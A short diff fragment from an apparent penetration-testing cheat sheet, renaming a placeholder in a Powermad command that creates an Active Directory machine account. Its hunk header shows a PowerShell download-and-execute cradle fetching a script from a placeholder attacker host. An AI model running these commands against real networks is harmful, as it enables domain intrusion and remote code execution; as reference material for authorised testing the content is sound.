@@ -7066,7 +7066,7 @@ powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOS
 ```cmd
 Import-Module ./Powermad.ps1
 $secureString = convertto-securestring "<PASSWORD>" -asplaintext -force
-New-MachineAccount -MachineAccount <NAME> -Domain <DOMAIN> -DomainController <DOMAIN> -Password $secureString
+New-MachineAccount -MachineAccount <MACHINE_ACCOUNT> -Domain <DOMAIN> -DomainController <DOMAIN> -Password $secureString
 ```
 
 #### PowerShell
